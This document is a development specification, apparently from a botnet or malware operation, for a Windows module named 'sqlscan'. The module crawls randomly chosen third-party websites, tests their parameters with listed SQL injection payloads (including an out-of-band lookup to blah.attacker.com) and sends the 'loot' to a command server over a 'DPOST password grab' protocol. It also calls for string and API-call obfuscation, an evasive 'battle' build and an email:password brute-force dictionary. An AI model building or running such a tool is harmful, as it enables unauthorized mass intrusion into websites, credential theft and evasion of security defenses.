JOB FOR THE DEVELOPMENT OF A WEBSITE VULNERABILITY SCANNER


PURPOSE

It is necessary to write a module of website vulnerability scanner. The module must be designed according to the rules given in the modules_HOWTO document.


PRINCIPLE OF OPERATION

The scanner consists of two main parts:
* crawler
* detector

The crawler generates URLs to check.
The detector checks them.

The result of checking a single site is the presence or absence of a vulnerability.
If a vulnerability is found, it is accompanied by additional information:
- the exact URL where the vulnerability was found
- triggered scanner rule
- expected DBMS type (determined from the triggered rule)

The result of the entire module is a list of vulnerabilities found in the process.


REALIZATION

0. Project name - sqlscan

1. The scanner can and must run in several threads. The number of threads is set by a parameter in the config; if it is missing, the compile-time constant is used.
There are two options for splitting into threads:
1)
- The first group of threads executes the crawler for different domains, generating a list for the detector.
- The second group of threads works with the detector, selecting records to be checked from the output list of the crawler.
2) in each thread both crawler and detector work simultaneously:
- the crawler generates the domain to be checked and passes it to the detector
- detector checks the domain and starts crawler again.

The second option looks easier in terms of inter-thread synchronization.


Initialize the module:
Initialize the pseudorandom number generator.
Randomness is of great importance in the algorithm.
The initialization must take place with the GetTickCount64() value.

Algorithm of the crawler's work:
1) start from https://findsubdomains.com/world-top (this URL and its parsing rules are set in config - TODO is not yet described in TOR)
s3.amazonaws.com/alexa-static/top-1m.csv.zip
2) choose a random site from a list from 1 to 50,000
3) define subdomains of this site, using DNS query
4) parsing main page:
- look for links with dynamic pages (there is a GET-request body: page.html?var=val&var1=val1...)
- Look for web forms with POST sending
5) Parsing robots.txt file. They may contain dynamic pages with a request not to index them.
6) Make a list of URI-request parameters for the page.
Separately mark those parameters that have:
- numbers (including negative ones)
- url-encoded values or plain text
All URI parameters are inherent to the page and are passed to the output.
However, further scanning is performed only for marked parameters suitable for scanning.
7) Add the page with the parameters in the output.

Algorithm of the detector's work:
1) Get the following URL from the output of the crawler
2) Get the next rule from the list of rules
3) Apply the rule to the page.
3.1) If the rule worked, add the page, the triggered parameter and the rule to the output. goto 1.
3.2) If the rule did not work, goto 2.
3.3) If there are no more rules, goto 1


5. The module sends a list of found vulnerabilities once every Н minutes (set by compilation constant and configuration from config),
provided that new passwords have been found since the previous sending.
The logic and protocol are described in the document "TOR of password grab DPOST.txt".
Sending format: text, separated into lines with \r\n symbols
One line contains one record.
The separator of the entry fields is the '|' character (vertical slash)
Record format:

url|param1|rule name1|param2|rule name2|...|paramN|rule nameN\r\n

thus, the number of entries is floating.
Here:
url - full URL of the site with the discovered vulnerability, INCLUDING ALL PARAMETERS (i.e. everything after the ? symbol in the URI is important information!)
param - the name of the parameter with the discovered vulnerability.
rule name - name of the rule of the discovered vulnerability.

6. The module is designed according to the rules of module development (see modules_HOWTO.txt)

7. The module sends the following events with the owa tag:
- "Version build %DATE% %TIME%" (once at startup)
- "Vulns sent to DPOST server" when collected vulnerabilities are sent successfully
- "Vulns send failure: servers unavailable" when there are no DPOST servers available.
- "No vulns detected, give up", if the module is finished and nothing is found (hypothetical case).
In this case, the module should generate a WantRelease event (see "module_HOWTO") to unload the module from memory

8. In this module, you can use C++ STL (std::string, containers) in a limited way.
   The use of std::mutex and synchronization primitives is forbidden - only
   WinAPI synchronization primitives (CRITICAL_SECTION etc).

9. To obfuscate strings with Andrivet library (attached, see _STR() macro)

10. System calls should be obfuscated with library GetApi.h. Be careful, obfuscation of system calls may cause crashes.

11. The module must have two versions - x32- and x64-bit.

12. The battle assembly should be obfuscated as much as possible, with all debug output turned off.

13. The module must have a debug version. The debug output should be printed to c:/temp/webscan.log (the path to the log is configured in the macro).
Each log entry must contain a timestamp accurate to a second.

14. The project must have a settings file config.h (the name does not matter, the important point - here are all the global settings - paths, macros-switches conditional compilation, etc.).

15. The module must work on all modern versions of Windows.
    The minimum supported version of Windows is Windows XP (if not possible, Windows Vista).

16. The project must be designed to be built in Microsoft Visual Studio at least 2015.

17. The Visual Studio project must be configured as follows:
* For ALL build profiles:
- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\
- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\
- Multiprocessor compilation: yes
* Release Profile:
- Debugging information format (C/C++ code creation): no
- Create debugging information (linker/debugger): no


THE RULES OF PHASING

Fuzzing rules are divided into two types:
- temporal: check the vulnerability by the presence of a delay in the HTTP response, when injecting code with the sleep command.
- DIFFERENT: check the vulnerability by the fact that there is no difference between a constant parameter value
and the same value, _computed_ in the injected expression.

An example of a time rule:
  ?var=aaa@aaa.com';waitfor delay '00:00:10'--
will be executed with a delay of 10 seconds, and
  ?var=aaa@aaa.com
will execute without a delay

An example of a difference rule:
  ?id=22
и
  ?id=23-1
will produce the same page

а
  ?id=22
и
  ?id=23
will output different pages (the point of the second check is to make sure that changing the parameter in general affects the output).

In difference rules, you need to take into account that formally different results may actually be the same
(for example, if the page has the current time output, the page has not actually changed, and formally the page a second ago is not equal to the page now).
Perhaps, when checking the page identity, we should count the Levenshtein distance (although there are doubts, since the Wagner-Fischer algorithm is memory-hungry).

CONFIGURES

The name of the config is the argument of the Ctl function Control, and the content of the config is the argument of CtlArg (see modules_HOWTO.txt)

All text in configs is case-sensitive; tags and service values must be in lowercase.
Configs must be in any one-byte encoding (ASCII is preferred).
XML comments are not allowed.


* settings
The config is a simple xml in the following format:

  <scan>
    <delay> delay between iterations of the fitting, in milliseconds</delay>
    <threads> number of threads</threads>.
    <start>URL of start page, from which to take the list of sites to check</start>
    <regex>regular expression to search for domains on the start page</regex>
  </scan>

All parameters in this config are optional. If no parameter is specified, the compile time constant is used.

* rules


List of rules for testing:

<rules>
  <rule>
    <name>rules name</name>
    <type>time|diff (one of these two values)</type>
    <value1>value to be substituted in the tested parameter</value1>
    <value2>value, substituted in the tested parameter</value2>
    <value3>value, substituted in the tested parameter</value3>.
   </rule>
   ...
   <rule>
     ...
   </rule>
</rules>

Tag assignment:
name - name of the rule; plays a role in the module output (indicates the type of vulnerability)
type - one of two values type or diff - defines rule type (temporary or diff)
value* - for temporary rules, this value should be inserted into tested parameter.
         If there are several tags with a value, you must substitute them all one by one until success.
         If the test is successful, the remaining values can be left unchecked.
       - For difference rules:
value1 - constant value: we will compare with the output to this value
value2 is a calculated equivalent: we will compare the result of output on this value with the output on value1.
value3 is the control value: we will compare the result of output on this value with the output on value1.
Success is considered if the output on value1 and value2 are the same, but value1 and value3 are different.


Initial version of the config

<rules>
  <rule>
    <name>MSSQL injection</name>
    <type>time</type>
    <value1>aaa@aaa.com';waitfor delay '00:00:10'--</value1>
   </rule>
  <rule>
    <name>MySQL injection</name>
    <type>time</type>
    <value1>aaa@aaa.com';SELECT BENCHMARK(1000000,MD5('A'));--</value1>
   </rule>
  <rule>
    <name>Postgres injection</name>
    <type>time</type>
    <value1>aaa@aaa.com';SELECT pg_sleep(10);--</value1>
   </rule>
  <rule>
    <name>Oracle injection</name>
    <type>time</type>
    <value1>aaa@aaa.com';BEGIN DBMS_LOCK.SLEEP(5); END; --</value1>
    <value2>aaa@aaa.com';SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; --</value2>
    <value3>aaa@aaa.com';SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; --</value3>
    <value4>aaa@aaa.com';SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; --</value4>
   </rule>
  <rule>
    <name>Unescaped numeric</name>
    <type>diff</type>
    <value1>22</value1>
    <value2>23-1</value2>
    <value3>23</value3>
   </rule>
  <rule>
    <name>Unescaped string</name>
    <type>diff</type>
    <value1>22</value1>
    <value2>22' and '1' = '1</value2>
    <value3>22' and '2'='1</value3>
   </rule>
</rules>


SECOND SECOND

In the second version, the module is not controlled by input data from configs, but by requests to the command server.


COMMAND SERVER AND CONFIGS

Previously, we received all the input data in the form of configs from the backend bots.
This is quite inconvenient for a variety of reasons - the backend's limitations on the size of configs,
restrictions on config management by the operator, lack of a common network status,
lack of specialized storage for results.

Instead, a command server will be used, from which we ask for settings and input lists,
and to which we give the loot.

In connection with this, all configs from the first version are abolished.
There is a new config srv, which contains a list of control server addresses,
separated by \r\n or \n, in address:port format.
If the port is even, it is HTTP, if it is odd - HTTPS.
If a protocol prefix (http/https) is specified, the prefix takes precedence over the specified port.
The module works with the control server that was reached first, for each request.

You can get the operating mode by sending an HTTP request to the server

GET /<group>/<clientid>/sql/mode HTTP/1.1
The group and clientid values are struct ParentInfo fields
 CHAR ParentID[256];
 CHAR ParentGroup[64];
(see module_HOWTO)

In the body of the HTTP response, the module expects the string brute or check.
Any other value is invalid - in that case the module makes repeated requests
every 5 minutes; the module won't start until it gets a correct answer.

Number of scan threads:
GET /<group>/<clientid>/sql/th HTTP/1.1

The response is a non-negative number.
If atoi(answer) == 0, then the default number of threads = std::thread_concurrency() - 1.

The scanner receives a list of domains to check with an HTTP request to the server

GET /<group>/<clientid>/sql/domains HTTP/1.1
Response format:
address1[\r]\n
domain2[\r]\n
...
(one or many entries)

We let the server know when we complete the enumeration of the given list:

GET /<group>/<clientid>/sql/over HTTP/1.1

The server's response is the same as to the request /domains - a new list of domains to work with.
If an unexpected response (empty list, error code, etc.) module goes to idle (scanning is stopped)
and makes the same request once every 10 minutes (time is a constant).

The dictionary for the enumeration is obtained by an HTTP request to the control server:
GET /<group>/<clientid>/sql/dict HTTP/1.1

In response we get the dictionary either as text/plain or application/gzip (look at the Content-Type response header)
If the packaging is in gzip, then after unpacking we expect the same dictionary format as for plain text.
The format is:
email:password[\r]\n

This is how we ask for the scanning rules:
GET /<group>/<clientid>/sql/rules HTTP/1.1

Response - text/plain or application/gzip (for now, just text/plain)

Sending is done via the DPOST protocol (see the "TOR of the DPOST password grab" for a description of the protocol) with the request

 POST /<group>/<clientid>/sql/81 HTTP/1.1

The collected data is sent in a multipart/form-data container with source and data fields.
Value of the source field - "SQL Injections".
Value of the data field: plain text, string delimiter \r\n
Record format:

url|param1|rule name1|param2|rule name2|...|paramN|rule nameN\r\n
...
(one or many records)

You can retrieve the frequency of the namain data from the control server with an HTTP request
GET /<group>/<clientid>/sql/freq HTTP/1.1

In the body of the response we expect a number - this is the number of seconds, not more often than that the data should be sent.
If it is 0 - we send immediately when a new result is ready.
If it is a positive number - we accumulate records in the buffer and send once every X seconds,
clearing the buffer on successful sending.

We let the server know when we complete the enumeration of the given list:

GET /<group>/<clientid>/sql/over HTTP/1.1

The server's response is the same as to the request /domains - a new list of domains to work with.
If an unexpected response (empty list, error code, etc.) module goes to idle (scanning is stopped)
and makes the same request once every 10 minutes (time is a constant).
